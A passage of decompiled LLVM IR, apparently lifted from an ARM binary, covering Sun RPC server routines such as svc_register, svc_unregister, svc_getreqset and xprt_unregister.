  %v0_2e1cc12 = phi i32 [ %v0_2e1cc13, %dec_label_pc_2e170 ], [ %v0_2e18c, %bb54 ], [ %v0_2e18c, %bb55 ]
  %v1_2e1b410 = phi i32 [ %v1_2e1b4, %dec_label_pc_2e170 ], [ %v1_2e1b411, %bb54 ], [ %v1_2e1b411, %bb55 ]
  %v0_2e1ac7 = phi i32 [ %v0_2e1ac, %dec_label_pc_2e170 ], [ %v0_2e1ac8, %bb54 ], [ %v0_2e1ac8, %bb55 ]
  %v1_2e1c0 = inttoptr i32 %v0_2e19c to i32*
  %v2_2e1c0 = load i32, i32* %v1_2e1c0, align 4
  store i32 %v2_2e1c0, i32* %ip.global-to-local, align 4
  %v2_2e1c4 = icmp eq i32 %v2_2e1c0, 0
  br i1 %v2_2e1c4, label %dec_label_pc_2e1cc, label %dec_label_pc_2e170

dec_label_pc_2e1cc:                               ; preds = %dec_label_pc_2e1c4
  %v2_2e1cc = icmp eq i32 %v0_2e1cc12, 0
  br i1 %v2_2e1cc, label %dec_label_pc_2e1e4, label %dec_label_pc_2e1d4

dec_label_pc_2e1d4:                               ; preds = %dec_label_pc_2e1cc
  store i32 %v1_2e1b410, i32* @r2, align 4
  %v0_2e1d8 = load i32, i32* @r4, align 4
  store i32 %v0_2e1d8, i32* %r0.global-to-local, align 4
  %v1_2e1dc = call i32 @svcerr_progvers(i32 %v0_2e1d8)
  store i32 %v1_2e1dc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2e1ec

dec_label_pc_2e1e4:                               ; preds = %dec_label_pc_2e1cc.thread, %dec_label_pc_2e1cc
  %v0_2e1e4 = load i32, i32* @r4, align 4
  store i32 %v0_2e1e4, i32* %r0.global-to-local, align 4
  %v1_2e1e8 = call i32 @__GI_svcerr_noprog(i32 %v0_2e1e4)
  store i32 %v1_2e1e8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2e1ec

dec_label_pc_2e1ec:                               ; preds = %dec_label_pc_2e0c4, %dec_label_pc_2e1d4, %dec_label_pc_2e194, %dec_label_pc_2e14c, %dec_label_pc_2e1e4
  %v0_2e1ec = load i32, i32* @r4, align 4
  %v1_2e1ec = add i32 %v0_2e1ec, 8
  %v2_2e1ec = inttoptr i32 %v1_2e1ec to i32*
  %v3_2e1ec = load i32, i32* %v2_2e1ec, align 4
  store i32 %v0_2e1ec, i32* %r0.global-to-local, align 4
  %v1_2e1f4 = add i32 %v3_2e1ec, 4
  %v2_2e1f4 = inttoptr i32 %v1_2e1f4 to i32*
  %v3_2e1f4 = load i32, i32* %v2_2e1f4, align 4
  store i32 %v3_2e1f4, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v3_2e1f4)
  %v0_2e200 = load i32, i32* %r0.global-to-local, align 4
  %v2_2e200 = icmp eq i32 %v0_2e200, 0
  br i1 %v2_2e200, label %dec_label_pc_2e208, label %dec_label_pc_2e220

dec_label_pc_2e208:                               ; preds = %dec_label_pc_2e1ec
  %v0_2e208 = load i32, i32* @r4, align 4
  store i32 %v0_2e208, i32* %r0.global-to-local, align 4
  %v1_2e20c = add i32 %v0_2e208, 8
  %v2_2e20c = inttoptr i32 %v1_2e20c to i32*
  %v3_2e20c = load i32, i32* %v2_2e20c, align 4
  %v1_2e210 = add i32 %v3_2e20c, 20
  %v2_2e210 = inttoptr i32 %v1_2e210 to i32*
  %v3_2e210 = load i32, i32* %v2_2e210, align 4
  store i32 %v3_2e210, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v3_2e210)
  %v1_2e234.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2e228

dec_label_pc_2e220:                               ; preds = %dec_label_pc_2e1ec
  %v7_2e220 = icmp eq i32 %v0_2e200, 1
  br i1 %v7_2e220, label %dec_label_pc_2e220.dec_label_pc_2e0c4_crit_edge, label %dec_label_pc_2e228

dec_label_pc_2e220.dec_label_pc_2e0c4_crit_edge:  ; preds = %dec_label_pc_2e220
  %v0_2e0c4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_2e0c4

dec_label_pc_2e228:                               ; preds = %dec_label_pc_2e220, %entry, %dec_label_pc_2e208
  %v1_2e234 = phi i32 [ %v0_2e078, %entry ], [ %v1_2e234.pre, %dec_label_pc_2e208 ], [ %v0_2e200, %dec_label_pc_2e220 ]
  store i32 %v3_2e058, i32* @r4, align 4
  store i32 %v6_2e058, i32* @r5, align 4
  store i32 %v27_2e058, i32* @lr, align 4
  ret i32 %v1_2e234

; uselistorder directives
  uselistorder i32 %v2_2e1c0, { 1, 2, 0 }
  uselistorder i1 %v9_2e1b4, { 1, 0 }
  uselistorder i32 %v3_2e180, { 0, 1, 2, 4, 3, 5, 6 }
  uselistorder i32 %v0_2e19c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_2e1ac, { 2, 1, 0 }
  uselistorder i32 %v1_2e1b4, { 3, 2, 0, 1 }
  uselistorder i32 %v0_2e114, { 1, 2, 0 }
  uselistorder i32 %v2_2e0e4, { 0, 2, 1, 3 }
  uselistorder i32 %v0_2e0c4, { 1, 0 }
  uselistorder i32 %v2_2e0c0, { 2, 1, 0 }
  uselistorder i32 %tmp22, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 6, 5, 12, 7, 8, 9, 10, 11, 14, 13, 19, 15, 16, 17, 18, 20, 0 }
  uselistorder label %dec_label_pc_2e228, { 0, 2, 1 }
  uselistorder label %dec_label_pc_2e1ec, { 4, 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_2e1e4, { 1, 0 }
  uselistorder label %dec_label_pc_2e1c4, { 2, 1, 0 }
  uselistorder label %bb54, { 1, 0 }
  uselistorder label %bb52, { 1, 0 }
  uselistorder label %dec_label_pc_2e170, { 1, 0 }
}

define i32 @svc_getreqset(i32* %arg1) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r4, align 4
  %v0_2e24c = call i32 @_rpc_dtablesize()
  %v0_2e250 = load i32, i32* @r4, align 4
  store i32 %v0_2e250, i32* @r6, align 4
  store i32 %v0_2e24c, i32* @r8, align 4
  store i32 0, i32* @r7, align 4
  store i32 1, i32* @sl, align 4
  %v5_2e29818 = icmp sgt i32 %v0_2e24c, 0
  br i1 %v5_2e29818, label %dec_label_pc_2e264, label %dec_label_pc_2e29c

dec_label_pc_2e264:                               ; preds = %entry, %dec_label_pc_2e28c
  %v0_2e264 = phi i32 [ %v1_2e28c, %dec_label_pc_2e28c ], [ %v0_2e250, %entry ]
  %v1_2e264 = inttoptr i32 %v0_2e264 to i32*
  %v2_2e264 = load i32, i32* %v1_2e264, align 4
  store i32 %v2_2e264, i32* @r4, align 4
  %v1_2e2781 = call i32 @ffsl(i32 %v2_2e264)
  %v2_2e27c3 = icmp eq i32 %v1_2e2781, 0
  %v1_2e2804 = add i32 %v1_2e2781, -1
  store i32 %v1_2e2804, i32* @r5, align 4
  %v1_2e2845 = load i32, i32* @r7, align 4
  %v2_2e2846 = add i32 %v1_2e2845, %v1_2e2804
  br i1 %v2_2e27c3, label %dec_label_pc_2e28c, label %dec_label_pc_2e26c

dec_label_pc_2e26c:                               ; preds = %dec_label_pc_2e264, %dec_label_pc_2e26c
  %v2_2e2847 = phi i32 [ %v2_2e284, %dec_label_pc_2e26c ], [ %v2_2e2846, %dec_label_pc_2e264 ]
  %v1_2e26c = call i32 @svc_getreq_common(i32 %v2_2e2847)
  %v0_2e270 = load i32, i32* @r4, align 4
  %v1_2e270 = load i32, i32* @sl, align 4
  %v2_2e270 = load i32, i32* @r5, align 4
  %v7_2e270 = shl i32 %v1_2e270, %v2_2e270
  %v8_2e270 = xor i32 %v7_2e270, %v0_2e270
  store i32 %v8_2e270, i32* @r4, align 4
  %v1_2e278 = call i32 @ffsl(i32 %v8_2e270)
  %v2_2e27c = icmp eq i32 %v1_2e278, 0
  %v1_2e280 = add i32 %v1_2e278, -1
  store i32 %v1_2e280, i32* @r5, align 4
  %v1_2e284 = load i32, i32* @r7, align 4
  %v2_2e284 = add i32 %v1_2e284, %v1_2e280
  br i1 %v2_2e27c, label %dec_label_pc_2e28c, label %dec_label_pc_2e26c

dec_label_pc_2e28c:                               ; preds = %dec_label_pc_2e26c, %dec_label_pc_2e264
  %v1_2e2a423 = phi i32 [ %v2_2e2846, %dec_label_pc_2e264 ], [ %v2_2e284, %dec_label_pc_2e26c ]
  %v0_2e290 = phi i32 [ %v1_2e2845, %dec_label_pc_2e264 ], [ %v1_2e284, %dec_label_pc_2e26c ]
  %v0_2e28c = load i32, i32* @r6, align 4
  %v1_2e28c = add i32 %v0_2e28c, 4
  store i32 %v1_2e28c, i32* @r6, align 4
  %v1_2e290 = add i32 %v0_2e290, 32
  store i32 %v1_2e290, i32* @r7, align 4
  %v1_2e294 = load i32, i32* @r8, align 4
  %v5_2e298 = icmp slt i32 %v1_2e290, %v1_2e294
  br i1 %v5_2e298, label %dec_label_pc_2e264, label %dec_label_pc_2e29c

dec_label_pc_2e29c:                               ; preds = %dec_label_pc_2e28c, %entry
  %v1_2e2a4 = phi i32 [ %v0_2e24c, %entry ], [ %v1_2e2a423, %dec_label_pc_2e28c ]
  ret i32 %v1_2e2a4

; uselistorder directives
  uselistorder i32 %v1_2e28c, { 1, 0 }
  uselistorder i32 %v8_2e270, { 1, 0 }
  uselistorder i32 %v2_2e2846, { 1, 0 }
  uselistorder i32 %v1_2e2845, { 1, 0 }
  uselistorder i32 (i32)* @ffsl, { 1, 0 }
  uselistorder label %dec_label_pc_2e26c, { 1, 0 }
  uselistorder label %dec_label_pc_2e264, { 1, 0 }
}

define i32 @__GI_svc_getreq(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %v2_2e2b4 = ptrtoint i32* %stack_var_-136 to i32
  store i32 0, i32* %r0.global-to-local, align 4
  %v2_2e2bc = ptrtoint i32* %stack_var_-8 to i32
  store i32 1, i32* %r2.global-to-local, align 4
  %v2_2e2cc6 = add i32 %v2_2e2bc, -128
  %v3_2e2cc7 = inttoptr i32 %v2_2e2cc6 to i32*
  store i32 0, i32* %v3_2e2cc7, align 4
  br label %dec_label_pc_2e2bc.dec_label_pc_2e2bc_crit_edge

dec_label_pc_2e2bc.dec_label_pc_2e2bc_crit_edge:  ; preds = %entry, %dec_label_pc_2e2bc.dec_label_pc_2e2bc_crit_edge
  %v1_2e2c0.pre = load i32, i32* %r2.global-to-local, align 4
  %v0_2e2cc.pre = load i32, i32* %r0.global-to-local, align 4
  %v4_2e2c0 = mul i32 %v1_2e2c0.pre, 4
  %v5_2e2c0 = add i32 %v4_2e2c0, %v2_2e2bc
  %v1_2e2c4 = add i32 %v1_2e2c0.pre, 1
  store i32 %v1_2e2c4, i32* %r2.global-to-local, align 4
  %v2_2e2cc = add i32 %v5_2e2c0, -128
  %v3_2e2cc = inttoptr i32 %v2_2e2cc to i32*
  store i32 %v0_2e2cc.pre, i32* %v3_2e2cc, align 4
  %tmp = icmp ult i32 %v1_2e2c4, 32
  br i1 %tmp, label %dec_label_pc_2e2bc.dec_label_pc_2e2bc_crit_edge, label %dec_label_pc_2e2d4

dec_label_pc_2e2d4:                               ; preds = %dec_label_pc_2e2bc.dec_label_pc_2e2bc_crit_edge
  store i32 %v2_2e2b4, i32* %r0.global-to-local, align 4
  %v0_2e2d8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_2e2d8, i32* %stack_var_-136, align 4
  %v2_2e2dc = call i32 @svc_getreqset(i32* nonnull %stack_var_-136)
  store i32 %v2_2e2dc, i32* %r0.global-to-local, align 4
  ret i32 %v2_2e2dc

; uselistorder directives
  uselistorder i32 %v2_2e2bc, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 4, 1, 2, 3, 0 }
  uselistorder i32 -128, { 1, 0 }
  uselistorder label %dec_label_pc_2e2bc.dec_label_pc_2e2bc_crit_edge, { 1, 0 }
}

define i32 @svc_unregister(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %v3_2e2ec = load i32, i32* @r4, align 4
  %v6_2e2ec = load i32, i32* @r5, align 4
  %v9_2e2ec = load i32, i32* @r6, align 4
  %v12_2e2ec = load i32, i32* @r7, align 4
  store i32 %arg1, i32* @r6, align 4
  store i32 %arg2, i32* @r7, align 4
  %v4_2e300 = call i32 @svc_find(i32 %arg1, i32 %arg2, i32* nonnull %stack_var_-28)
  store i32 %v4_2e300, i32* @r4, align 4
  %v2_2e304 = icmp eq i32 %v4_2e300, 0
  br i1 %v2_2e304, label %dec_label_pc_2e344, label %dec_label_pc_2e30c

dec_label_pc_2e30c:                               ; preds = %entry
  %v3_2e30c = load i32, i32* %stack_var_-28, align 4
  %v1_2e310 = inttoptr i32 %v4_2e300 to i32*
  %v2_2e310 = load i32, i32* %v1_2e310, align 4
  store i32 %v2_2e310, i32* @r5, align 4
  %v2_2e314 = icmp eq i32 %v3_2e30c, 0
  br i1 %v2_2e314, label %dec_label_pc_2e320, label %bb

bb:                                               ; preds = %dec_label_pc_2e30c
  %v3_2e318 = inttoptr i32 %v3_2e30c to i32*
  store i32 %v2_2e310, i32* %v3_2e318, align 4
  br label %dec_label_pc_2e328

dec_label_pc_2e320:                               ; preds = %dec_label_pc_2e30c
  %v0_2e320 = call i32 @__rpc_thread_variables()
  %v0_2e324 = load i32, i32* @r5, align 4
  %v2_2e324 = add i32 %v0_2e320, 184
  %v3_2e324 = inttoptr i32 %v2_2e324 to i32*
  store i32 %v0_2e324, i32* %v3_2e324, align 4
  br label %dec_label_pc_2e328

dec_label_pc_2e328:                               ; preds = %bb, %dec_label_pc_2e320
  %v0_2e32c = load i32, i32* @r4, align 4
  store i32 %v0_2e32c, i32* @r0, align 4
  %v2_2e330 = inttoptr i32 %v0_2e32c to i32*
  store i32 0, i32* %v2_2e330, align 4
  %v0_2e334 = call i32 @free()
  %v0_2e338 = load i32, i32* @r6, align 4
  %v0_2e33c = load i32, i32* @r7, align 4
  %v2_2e340 = call i32 @__GI_pmap_unset(i32 %v0_2e338, i32 %v0_2e33c)
  br label %dec_label_pc_2e344

dec_label_pc_2e344:                               ; preds = %entry, %dec_label_pc_2e328
  %v1_2e34c = phi i32 [ 0, %entry ], [ %v2_2e340, %dec_label_pc_2e328 ]
  store i32 %v3_2e2ec, i32* @r4, align 4
  store i32 %v6_2e2ec, i32* @r5, align 4
  store i32 %v9_2e2ec, i32* @r6, align 4
  store i32 %v12_2e2ec, i32* @r7, align 4
  ret i32 %v1_2e34c

; uselistorder directives
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_2e344, { 1, 0 }
  uselistorder label %dec_label_pc_2e328, { 1, 0 }
}

define i32 @__rpc_thread_svc_cleanup() local_unnamed_addr {
entry:
  %v0_2e3641 = call i32 @__rpc_thread_variables()
  %v1_2e3682 = add i32 %v0_2e3641, 184
  %v2_2e3683 = inttoptr i32 %v1_2e3682 to i32*
  %v3_2e3684 = load i32, i32* %v2_2e3683, align 4
  %v2_2e36c6 = icmp eq i32 %v3_2e3684, 0
  br i1 %v2_2e36c6, label %dec_label_pc_2e374, label %dec_label_pc_2e35c

dec_label_pc_2e35c:                               ; preds = %entry, %dec_label_pc_2e35c
  %v0_2e35c = phi i32 [ %v3_2e368, %dec_label_pc_2e35c ], [ %v3_2e3684, %entry ]
  %v1_2e35c = add i32 %v0_2e35c, 4
  %v2_2e35c = inttoptr i32 %v1_2e35c to i32*
  %v3_2e35c = load i32, i32* %v2_2e35c, align 4
  %v4_2e35c = add i32 %v0_2e35c, 8
  %v5_2e35c = inttoptr i32 %v4_2e35c to i32*
  %v6_2e35c = load i32, i32* %v5_2e35c, align 4
  %v2_2e360 = call i32 @svc_unregister(i32 %v3_2e35c, i32 %v6_2e35c)
  %v0_2e364 = call i32 @__rpc_thread_variables()
  %v1_2e368 = add i32 %v0_2e364, 184
  %v2_2e368 = inttoptr i32 %v1_2e368 to i32*
  %v3_2e368 = load i32, i32* %v2_2e368, align 4
  %v2_2e36c = icmp eq i32 %v3_2e368, 0
  br i1 %v2_2e36c, label %dec_label_pc_2e374, label %dec_label_pc_2e35c

dec_label_pc_2e374:                               ; preds = %dec_label_pc_2e35c, %entry
  %v0_2e364.lcssa = phi i32 [ %v0_2e3641, %entry ], [ %v0_2e364, %dec_label_pc_2e35c ]
  ret i32 %v0_2e364.lcssa

; uselistorder directives
  uselistorder i32 %v3_2e368, { 1, 0 }
  uselistorder i32 %v0_2e35c, { 1, 0 }
  uselistorder label %dec_label_pc_2e35c, { 1, 0 }
}

define i32 @__GI_svc_register(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-36 = alloca i32, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg3, i32* @r6, align 4
  store i32 %arg1, i32* @r8, align 4
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* @r7, align 4
  store i32 %arg5, i32* @sl, align 4
  %v4_2e3a8 = call i32 @svc_find(i32 %arg2, i32 %arg3, i32* nonnull %stack_var_-36)
  store i32 %v4_2e3a8, i32* %r0.global-to-local, align 4
  %v2_2e3ac = icmp eq i32 %v4_2e3a8, 0
  br i1 %v2_2e3ac, label %dec_label_pc_2e3c4, label %dec_label_pc_2e3b4

dec_label_pc_2e3b4:                               ; preds = %entry
  %v1_2e3b4 = add i32 %v4_2e3a8, 12
  %v2_2e3b4 = inttoptr i32 %v1_2e3b4 to i32*
  %v3_2e3b4 = load i32, i32* %v2_2e3b4, align 4
  %v1_2e3b8 = load i32, i32* @r7, align 4
  %v9_2e3b8 = icmp eq i32 %v3_2e3b4, %v1_2e3b8
  br i1 %v9_2e3b8, label %dec_label_pc_2e3e8, label %dec_label_pc_2e40c

dec_label_pc_2e3c4:                               ; preds = %entry
  store i32 16, i32* %r0.global-to-local, align 4
  %v1_2e3c8 = call i32 @malloc(i32 16)
  store i32 %v1_2e3c8, i32* %r0.global-to-local, align 4
  store i32 %v1_2e3c8, i32* @r4, align 4
  %v2_2e3cc = icmp eq i32 %v1_2e3c8, 0
  br i1 %v2_2e3cc, label %dec_label_pc_2e40c, label %dec_label_pc_2e3d4

dec_label_pc_2e3d4:                               ; preds = %dec_label_pc_2e3c4
  %v1_2e3d4 = add i32 %v1_2e3c8, 4
  %v2_2e3d4 = inttoptr i32 %v1_2e3d4 to i32*
  %v3_2e3d4 = load i32, i32* @r5, align 4
  store i32 %v3_2e3d4, i32* %v2_2e3d4, align 4
  %v4_2e3d4 = add i32 %v1_2e3c8, 8
  %v5_2e3d4 = inttoptr i32 %v4_2e3d4 to i32*
  %v6_2e3d4 = load i32, i32* @r6, align 4
  store i32 %v6_2e3d4, i32* %v5_2e3d4, align 4
  %v7_2e3d4 = add i32 %v1_2e3c8, 12
  %v8_2e3d4 = inttoptr i32 %v7_2e3d4 to i32*
  %v9_2e3d4 = load i32, i32* @r7, align 4
  store i32 %v9_2e3d4, i32* %v8_2e3d4, align 4
  %v0_2e3d8 = call i32 @__rpc_thread_variables()
  store i32 %v0_2e3d8, i32* %r0.global-to-local, align 4
  %v1_2e3dc = add i32 %v0_2e3d8, 184
  %v2_2e3dc = inttoptr i32 %v1_2e3dc to i32*
  %v3_2e3dc = load i32, i32* %v2_2e3dc, align 4
  %v1_2e3e0 = load i32, i32* @r4, align 4
  %v2_2e3e0 = inttoptr i32 %v1_2e3e0 to i32*
  store i32 %v3_2e3dc, i32* %v2_2e3e0, align 4
  %v0_2e3e4 = load i32, i32* @r4, align 4
  %v1_2e3e4 = load i32, i32* %r0.global-to-local, align 4
  %v2_2e3e4 = add i32 %v1_2e3e4, 184
  %v3_2e3e4 = inttoptr i32 %v2_2e3e4 to i32*
  store i32 %v0_2e3e4, i32* %v3_2e3e4, align 4
  br label %dec_label_pc_2e3e8

dec_label_pc_2e3e8:                               ; preds = %dec_label_pc_2e3b4, %dec_label_pc_2e3d4
  %v0_2e3e8 = load i32, i32* @sl, align 4
  %v2_2e3e8 = icmp eq i32 %v0_2e3e8, 0
  br i1 %v2_2e3e8, label %bb, label %dec_label_pc_2e3f4

bb:                                               ; preds = %dec_label_pc_2e3e8
  store i32 1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2e410

dec_label_pc_2e3f4:                               ; preds = %dec_label_pc_2e3e8
  %v0_2e3f4 = load i32, i32* @r5, align 4
  store i32 %v0_2e3f4, i32* %r0.global-to-local, align 4
  %v0_2e3f8 = load i32, i32* @r6, align 4
  %v0_2e400 = load i32, i32* @r8, align 4
  %v1_2e400 = add i32 %v0_2e400, 4
  %v2_2e400 = inttoptr i32 %v1_2e400 to i16*
  %v3_2e400 = load i16, i16* %v2_2e400, align 2
  %v4_2e400 = zext i16 %v3_2e400 to i32
  %v4_2e404 = call i32 @pmap_set(i32 %v0_2e3f4, i32 %v0_2e3f8, i32 %v0_2e3e8, i32 %v4_2e400)
  store i32 %v4_2e404, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2e410

dec_label_pc_2e40c:                               ; preds = %dec_label_pc_2e3b4, %dec_label_pc_2e3c4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_2e410

dec_label_pc_2e410:                               ; preds = %bb, %dec_label_pc_2e3f4, %dec_label_pc_2e40c
  %v1_2e418 = phi i32 [ 1, %bb ], [ %v4_2e404, %dec_label_pc_2e3f4 ], [ 0, %dec_label_pc_2e40c ]
  ret i32 %v1_2e418

; uselistorder directives
  uselistorder i32 %v1_2e3c8, { 2, 1, 0, 3, 4, 5 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 3, 5, 6, 8, 7, 10, 9, 0 }
  uselistorder i32 184, { 9, 10, 14, 2, 12, 11, 13, 3, 4, 0, 5, 6, 7, 8, 1 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_2e410, { 2, 1, 0 }
  uselistorder label %dec_label_pc_2e40c, { 1, 0 }
  uselistorder label %dec_label_pc_2e3e8, { 1, 0 }
}

define i32 @xprt_unregister(i32* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_2e41c = load i32, i32* @r4, align 4
  store i32 %v3_2e41c, i32* %stack_var_-16, align 4
  %v6_2e41c = load i32, i32* @r5, align 4
  %v9_2e41c = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r4, align 4
  %v2_2e424 = load i32, i32* %arg1, align 4
  store i32 %v2_2e424, i32* @r5, align 4
  %v0_2e428 = call i32 @_rpc_dtablesize()
  store i32 %v0_2e428, i32* %r0.global-to-local, align 4
  %v0_2e42c = load i32, i32* @r5, align 4
  %v6_2e430 = icmp slt i32 %v0_2e42c, %v0_2e428
  br i1 %v6_2e430, label %dec_label_pc_2e434, label %dec_label_pc_2e4b0

dec_label_pc_2e434:                               ; preds = %entry
  %v0_2e434 = call i32 @__rpc_thread_variables()
  store i32 %v0_2e434, i32* %r0.global-to-local, align 4
  %v1_2e438 = add i32 %v0_2e434, 180
  %v2_2e438 = inttoptr i32 %v1_2e438 to i32*
  %v3_2e438 = load i32, i32* %v2_2e438, align 4
  %v0_2e43c = load i32, i32* @r5, align 4
  %v3_2e43c = mul i32 %v0_2e43c, 4
  %v2_2e440 = add i32 %v3_2e43c, %v3_2e438
  %v3_2e440 = inttoptr i32 %v2_2e440 to i32*
  %v4_2e440 = load i32, i32* %v3_2e440, align 4
  %v1_2e444 = load i32, i32* @r4, align 4
  %v9_2e444 = icmp eq i32 %v4_2e440, %v1_2e444
  br i1 %v9_2e444, label %dec_label_pc_2e44c, label %dec_label_pc_2e4b0

dec_label_pc_2e44c:                               ; preds = %dec_label_pc_2e434
  store i32 0, i32* %v3_2e440, align 4
  %v5_2e458 = icmp slt i32 %v0_2e43c, 1024
  br i1 %v5_2e458, label %dec_label_pc_2e468, label %dec_label_pc_2e45c

dec_label_pc_2e45c:                               ; preds = %dec_label_pc_2e44c, %dec_label_pc_2e468
  store i32 0, i32* @r4, align 4
  store i32 -1, i32* @r6, align 4
  br label %dec_label_pc_2e4a0

dec_label_pc_2e468:                               ; preds = %dec_label_pc_2e44c
  %v0_2e468 = load i32, i32* %r0.global-to-local, align 4
  %v4_2e468 = call i32 @__GI___rpc_thread_svc_fdset(i32 %v0_2e468, i32 %v3_2e438, i32 %v3_2e43c, i32 0)
  store i32 %v4_2e468, i32* %r0.global-to-local, align 4
  %v0_2e46c = load i32, i32* @r5, align 4
  %v3_2e46c = udiv i32 %v0_2e46c, 32
  %v4_2e470 = mul nuw nsw i32 %v3_2e46c, 4
  %v5_2e470 = add i32 %v4_2e470, %v4_2e468
  %v6_2e470 = inttoptr i32 %v5_2e470 to i32*
  %v7_2e470 = load i32, i32* %v6_2e470, align 4
  %v1_2e474 = urem i32 %v0_2e46c, 32
  %tmp9 = shl i32 -1, %v1_2e474
  %v8_2e47c = add i32 %tmp9, -1
  %v9_2e47c = and i32 %v7_2e470, %v8_2e47c
  store i32 %v9_2e47c, i32* %v6_2e470, align 4
  br label %dec_label_pc_2e45c

dec_label_pc_2e488:                               ; preds = %dec_label_pc_2e4a0
  %v0_2e488 = call i32 @__rpc_thread_svc_pollfd()
  store i32 %v0_2e488, i32* %r0.global-to-local, align 4
  %v1_2e48c = inttoptr i32 %v0_2e488 to i32*
  %v2_2e48c = load i32, i32* %v1_2e48c, align 4
  store i32 %v2_2e48c, i32* %r0.global-to-local, align 4
  %v1_2e490 = load i32, i32* @r4, align 4
  %v4_2e490 = mul i32 %v1_2e490, 8
  %v5_2e490 = add i32 %v4_2e490, %v2_2e48c
  %v6_2e490 = inttoptr i32 %v5_2e490 to i32*
  %v7_2e490 = load i32, i32* %v6_2e490, align 4
  %v1_2e494 = load i32, i32* @r5, align 4
  %v9_2e494 = icmp eq i32 %v7_2e490, %v1_2e494
  br i1 %v9_2e494, label %bb, label %bb8

bb:                                               ; preds = %dec_label_pc_2e488
  %v1_2e498 = load i32, i32* @r6, align 4
  store i32 %v1_2e498, i32* %v6_2e490, align 4
  %v0_2e49c.pre = load i32, i32* @r4, align 4
  br label %bb8

bb8:                                              ; preds = %dec_label_pc_2e488, %bb
  %v0_2e49c = phi i32 [ %v1_2e490, %dec_label_pc_2e488 ], [ %v0_2e49c.pre, %bb ]
  %v1_2e49c = add i32 %v0_2e49c, 1
  store i32 %v1_2e49c, i32* @r4, align 4
  br label %dec_label_pc_2e4a0

dec_label_pc_2e4a0:                               ; preds = %dec_label_pc_2e45c, %bb8
  %v0_2e4a0 = call i32 @__rpc_thread_svc_max_pollfd()
  store i32 %v0_2e4a0, i32* %r0.global-to-local, align 4
  %v1_2e4a4 = inttoptr i32 %v0_2e4a0 to i32*
  %v2_2e4a4 = load i32, i32* %v1_2e4a4, align 4
  %v0_2e4a8 = load i32, i32* @r4, align 4
  %v5_2e4ac = icmp slt i32 %v0_2e4a8, %v2_2e4a4
  br i1 %v5_2e4ac, label %dec_label_pc_2e488, label %dec_label_pc_2e4b0

dec_label_pc_2e4b0:                               ; preds = %dec_label_pc_2e4a0, %dec_label_pc_2e434, %entry
  %v1_2e4b4 = phi i32 [ %v0_2e434, %dec_label_pc_2e434 ], [ %v0_2e428, %entry ], [ %v0_2e4a0, %dec_label_pc_2e4a0 ]
  %v2_2e4b0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_2e4b0, i32* @r4, align 4
  store i32 %v6_2e41c, i32* @r5, align 4
  store i32 %v9_2e41c, i32* @r6, align 4
  ret i32 %v1_2e4b4

; uselistorder directives
  uselistorder i32 %v0_2e46c, { 1, 0 }
  uselistorder i32 %v0_2e43c, { 1, 0 }
  uselistorder i32 %v3_2e438, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 2, 4, 5, 6, 7, 0 }
  uselistorder label %dec_label_pc_2e4a0, { 1, 0 }
  uselistorder label %bb8, { 1, 0 }
  uselistorder label %dec_label_pc_2e45c, { 1, 0 }
}

define i32 @svc_getreq_poll(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 0, i32* @r6, align 4
  store i32 %arg1, i32* @r7, align 4
  store i32 %arg2, i32* @r8, align 4
  br label %dec_label_pc_2e518

dec_label_pc_2e4d0:                               ; preds = %bb9
  %v3_2e528 = mul i32 %v0_2e520, 8
  %v0_2e4d0 = load i32, i32* @r7, align 4
  %v2_2e4d0 = add i32 %v0_2e4d0, %v3_2e528
  %v3_2e4d0 = inttoptr i32 %v2_2e4d0 to i32*
  %v4_2e4d0 = load i32, i32* %v3_2e4d0, align 4
  store i32 %v4_2e4d0, i32* @r4, align 4
  %v7_2e4d4 = icmp eq i32 %v4_2e4d0, -1
  br i1 %v7_2e4d4, label %dec_label_pc_2e514, label %dec_label_pc_2e4e0

dec_label_pc_2e4e0:                               ; preds = %dec_label_pc_2e4d0
  %v1_2e4e0 = add i32 %v2_2e4d0, 6
  %v2_2e4e0 = inttoptr i32 %v1_2e4e0 to i16*
  %v3_2e4e0 = load i16, i16* %v2_2e4e0, align 2
